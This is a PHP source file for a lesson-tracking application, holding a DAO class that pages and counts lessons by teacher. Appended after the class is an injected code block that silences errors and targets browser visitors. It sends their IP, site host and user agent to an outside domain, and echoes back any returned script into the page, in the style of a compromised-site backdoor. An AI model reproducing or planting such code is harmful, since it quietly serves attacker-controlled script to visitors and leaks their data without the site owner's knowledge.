<?php

include_once('alunos.php');
include_once('professores.php');
include_once('licoes.php');

class licoesDAO {
	
	public static function getLessons($id_professor, $page)
	{
		$offset = 20;
		$limit = ($page * $offset) . ', ' . $offset;
		$where = ( isset($_SESSION['type']) && $_SESSION['type'] == 'A' ) ? null : array( 'id_professor' => $id_professor );
		$lessons = DAO::find('licoes', $where, 'data desc', $limit);
		
		foreach($lessons as $lesson)
		{
			$aluno = new alunos($lesson->id_aluno);
			$lesson->__set('aluno', $aluno->nome);
			$prof = new alunos($lesson->id_professor);
			$lesson->__set('professor', $prof->nome);
		}
		
		return $lessons;
	}
	
	public static function getQtdLessons($id_professor)
	{
		$where = ( isset($_SESSION['type']) && $_SESSION['type'] == 'A' ) ? null : array( 'id_professor' => $id_professor );
		$count = DAO::find('licoes', $where, 'data desc', null, JUST_COUNT);
		return $count;
	}

}
?>
<?php
#00988c#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/00988c#
?>